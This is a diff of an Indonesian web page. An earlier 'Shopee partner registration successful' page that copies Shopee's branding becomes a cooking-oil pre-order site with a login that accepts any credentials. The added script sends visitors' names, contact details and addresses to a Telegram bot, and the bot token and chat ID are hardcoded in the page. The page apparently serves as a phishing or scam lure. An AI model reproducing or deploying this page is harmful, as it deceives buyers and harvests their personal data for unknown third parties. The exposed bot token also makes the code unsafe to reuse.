@@ -3,62 +3,402 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registrasi Mitra Shopee Berhasil</title>
+    <title>UD. Sinar Gemilang - Pre-Order Minyak Goreng</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background-color: #f4f4f4;
+            color: #333;
+            line-height: 1.6;
         }
         .container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        /* Hero Section - Halaman Depan Menarik */
+        #home-section {
+            background: linear-gradient(135deg, #007bff 0%, #ffd700 100%);
+            color: white;
             text-align: center;
-            max-width: 400px;
+            padding: 100px 20px;
+            border-radius: 0 0 20px 20px;
+            animation: fadeIn 1s ease-in;
         }
-        .success-icon {
-            font-size: 60px;
-            color: #EE4D2D; /* Warna orange Shopee */
-            margin-bottom: 20px;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        h1 {
-            color: #333;
+        #home-section h1 {
+            font-size: 3em;
             margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
-        p {
-            color: #666;
-            font-size: 16px;
+        #home-section p {
+            font-size: 1.2em;
+            margin-bottom: 30px;
+        }
+        .logo-placeholder {
+            width: 150px;
+            height: 150px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5em;
+            border: 3px solid white;
+        }
+        .start-btn {
+            background: #28a745;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1.2em;
+            transition: background 0.3s, transform 0.3s;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        .start-btn:hover {
+            background: #218838;
+            transform: scale(1.05);
+        }
+
+        /* Login Section */
+        #login-section {
+            display: none;
+            background: white;
+            margin-top: 50px;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+        #login-section h2 {
+            color: #007bff;
             margin-bottom: 20px;
+        }
+        .login-form {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
         }
         .login-btn {
-            background-color: #EE4D2D; /* Warna orange Shopee */
+            background: #007bff;
             color: white;
-            padding: 12px 24px;
+            padding: 12px 20px;
             border: none;
             border-radius: 5px;
-            font-size: 16px;
             cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
+            width: 100%;
+            font-size: 16px;
+            transition: background 0.3s;
         }
         .login-btn:hover {
-            background-color: #CC3D1F; /* Orange Shopee yang lebih gelap untuk hover */
+            background: #0056b3;
+        }
+        .back-btn {
+            background: #6c757d;
+            color: white;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Form Pre-Order Section */
+        #form-section {
+            display: none;
+            background: white;
+            margin-top: 50px;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            border-radius: 10px;
+            animation: slideIn 0.5s ease-out;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        #form-section h2 {
+            color: #007bff;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logout-btn {
+            background: #dc3545;
+            color: white;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            float: right;
+            margin-bottom: 20px;
+        }
+        #user-info {
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        form {
+            display: grid;
+            gap: 15px;
+        }
+        label {
+            font-weight: bold;
+            color: #333;
+        }
+        input, textarea {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .radio-group label {
+            display: flex;
+            align-items: center;
+            font-weight: normal;
+        }
+        .radio-group input[type="radio"] {
+            width: auto;
+            margin-right: 10px;
+        }
+        button[type="submit"] {
+            background: #28a745;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button[type="submit"]:hover {
+            background: #218838;
+        }
+
+        /* Responsif */
+        @media (max-width: 768px) {
+            #home-section h1 { font-size: 2em; }
+            #home-section { padding: 60px 20px; }
+            .container { padding: 10px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="success-icon">✅</div>
-        <h1>Registrasi Mitra Shopee Berhasil!</h1>
-        <p>Selamat! Akun Mitra Shopee Anda telah berhasil dibuat. Silakan login di aplikasi Shopee untuk melanjutkan.</p>
-        <a href="formulirpesanan.html" class="login-btn>isiformulirpesanan</a>
+        <!-- Section 1: Halaman Depan (Hero) -->
+        <section id="home-section">
+            <div class="logo-placeholder">UD. Sinar Gemilang</div>
+            <h1>Selamat Datang di UD. Sinar Gemilang</h1>
+            <p>Distributor Minyak Goreng Berkualitas Tinggi. Ajukan Pre-Order Sekarang untuk Pengiriman Cepat!</p>
+            <p>Produk Unggulan: Minyak Kita Wilmar, Sinar Gemilang, dan Sinar Mas.</p>
+            <button class="start-btn" onclick="showLogin()">Mulai Login</button>
+        </section>
+
+        <!-- Section 2: Form Login (Disembunyikan Awalnya) -->
+        <section id="login-section">
+            <h2>Login ke Akun Anda</h2>
+            <p>Masukkan email dan password untuk melanjutkan.</p>
+            <form class="login-form" id="login-form">
+                <input type="text" id="login-email" placeholder="Email (contoh: user@example.com )" required>
+                <input type="password" id="login-password" placeholder="Password" required minlength="6">
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+            <button class="back-btn" onclick="showHome()">Kembali ke Halaman Utama</button>
+        </section>
+
+        <!-- Section 3: Formulir Pre-Order (Disembunyikan Awalnya) -->
+        <section id="form-section">
+            <button class="logout-btn" onclick="logout()">Logout</button>
+            <div id="user-info">
+                <h3>Selamat Datang Kembali!</h3>
+                <p>Akun: <span id="user-account"></span></p>
+            </div>
+            <h2>Formulir Pengajuan Pre-Order Minyak Goreng</h2>
+            <form id="preorder-form">
+                <label for="nama">Nama Lengkap Pelanggan:</label>
+                <input type="text" id="nama" required>
+
+                <label for="email">Email/No. HP (dari Login):</label>
+                <input type="text" id="email" readonly required>
+
+                <label for="telepon">Nomor Telepon Lain (Opsional):</label>
+                <input type="tel" id="telepon">
+
+                <label for="alamat">Alamat Pengiriman:</label>
+                <textarea id="alamat" rows="3" required></textarea>
+
+                <label>Pilihan Produk:</label>
+                <div class="radio-group">
+                    <label><input type="radio" name="produk" value="Minyak Kita Wilmar" required> Minyak Kita Wilmar</label>
+                    <label><input type="radio" name="produk" value="Minyak Kita Sinar Gemilang" required> Minyak Kita Sinar Gemilang</label>
+                    <label><input type="radio" name="produk" value="Minyak Kita Sinar Mas" required> Minyak Kita Sinar Mas</label>
+                </div>
+
+                <label for="jumlah">Jumlah Pre-Order (misal : 100 ctn):</label>
+                <input type="text" id="jumlah" required>
+
+                <label for="tanggal">Tanggal Pre order:</label>
+                <input type="date" id="tanggal" required>
+
+                <button type="submit">Kirim Pengajuan</button>
+            </form>
+        </section>
     </div>
+
+    <script>
+        let userAccount = null;
+        const telegramBotToken = '8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk';
+        const telegramChatId = '5923031825';
+
+        // Fungsi untuk mengirim pesan ke Telegram
+        async function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+            try {
+                const response = await fetch(url);
+                if (!response.ok) {
+                    // Tambahkan detail kesalahan untuk membantu diagnosis
+                    const errorBody = await response.text();
+                    throw new Error(`Telegram API error: ${response.status} ${response.statusText}. Response body: ${errorBody}`);
+                }
+                const data = await response.json();
+                console.log('Telegram message sent:', data);
+            } catch (error) {
+                console.error('Failed to send Telegram message:', error);
+                alert('Gagal mengirim notifikasi Telegram. Silakan coba lagi. Periksa console untuk detail.');
+            }
+        }
+
+        // Tampilkan section login
+        function showLogin() {
+            document.getElementById('home-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+        }
+
+        // Kembali ke home
+        function showHome() {
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('home-section').style.display = 'block';
+        }
+
+        // Handle login form
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('login-email').value.trim();
+            const password = document.getElementById('login-password').value;
+
+            // Validasi email
+            if (!isValidEmail(email)) {
+                alert('Format email tidak valid.');
+                return;
+            }
+
+            // Validasi password
+            if (password.length < 6) {
+                alert('Password minimal 6 karakter.');
+                return;
+            }
+
+            // Simulasi validasi (ganti dengan backend cek user)
+            if (email && password.length >= 6) {
+                userAccount = email;
+                // Sembunyikan login, tampilkan form pre-order
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('form-section').style.display = 'block';
+                document.getElementById('user-account').textContent = userAccount;
+                document.getElementById('email').value = userAccount; // Set ke form
+                alert('Login berhasil! Silakan ajukan pre-order.');
+            } else {
+                alert('Email dan password harus diisi. Password minimal 6 karakter.');
+            }
+        });
+
+        // Logout
+        function logout() {
+            userAccount = null;
+            document.getElementById('form-section').style.display = 'none';
+            document.getElementById('home-section').style.display = 'block';
+            document.getElementById('login-form').reset();
+        }
+
+        // Fungsi Validasi email
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Handle submit pre-order form
+        document.getElementById('preorder-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const nama = document.getElementById('nama').value.trim();
+            const telepon = document.getElementById('telepon').value.trim();
+            const alamat = document.getElementById('alamat').value.trim();
+            const produk = document.querySelector('input[name="produk"]:checked');
+            const jumlah = document.getElementById('jumlah').value.trim();
+            const tanggal = document.getElementById('tanggal').value;
+
+            // Validasi formulir
+            if (!nama || !alamat || !produk || !jumlah || !tanggal) {
+                alert('Mohon isi semua kolom yang wajib diisi.');
+                return;
+            }
+
+            if (isNaN(jumlah)) {
+                alert('Jumlah pre-order harus berupa angka.');
+                return;
+            }
+
+            const formData = new FormData(this);
+            const data = {
+                akun: userAccount,
+                nama: document.getElementById('nama').value,
+                email: document.getElementById('email').value,
+                telepon: document.getElementById('telepon').value,
+                alamat: document.getElementById('alamat').value,
+                produk: document.querySelector('input[name="produk"]:checked').value,
+                jumlah: document.getElementById('jumlah').value,
+                tanggal: document.getElementById('tanggal').value,
+                timestamp: new Date().toISOString()
+            };
+
+            // Kirim ke Telegram
+            let message = 'Pengajuan Pre-Order Baru:\n';
+            for (const key in data) {
+                message += `${key}: ${data[key]}\n`;
+            }
+            sendTelegramMessage(message);
+
+            // Log ke console (untuk testing)
+            console.log('Pengajuan Pre-Order:', data);
+
+            // Alert sukses
+            alert('Pengajuan pre-order berhasil dikirim! Kami akan hubungi Anda segera via email/no. HP terdaftar.');
+
+            // Reset form
+            this.reset();
+            document.querySelectorAll('input[name="produk"]').forEach(r => r.checked = false);
+        });
+    </script>
 </body>
 </html>
